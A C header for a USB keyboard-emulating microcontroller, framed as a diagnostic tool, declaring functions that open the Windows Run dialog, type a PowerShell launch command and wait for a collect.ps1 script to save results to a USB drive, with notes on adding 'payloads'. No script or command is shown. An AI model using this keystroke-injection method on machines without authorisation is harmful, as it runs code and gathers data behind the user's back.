#pragma once

#include <USBHIDKeyboard.h>

// ─────────────────────────────────────────────────────────────────────────────
// diagnostic.h — diagnostic sequence module
//
// Drives the state machine that:
//   1. Opens the Windows Run dialog (Win+R)
//   2. Types the PowerShell launch command
//   3. Waits for collect.ps1 to finish writing results to the MSC drive
//
// Adding a new payload:
//   • Add your script to scripts/
//   • Add its launch command to include/payloads.h
//   • diagStart() will send all commands in the payloads array in sequence
// ─────────────────────────────────────────────────────────────────────────────

void diagStart(USBHIDKeyboard &kb);
bool diagIsRunning();
void diagTick(USBHIDKeyboard &kb, unsigned long now);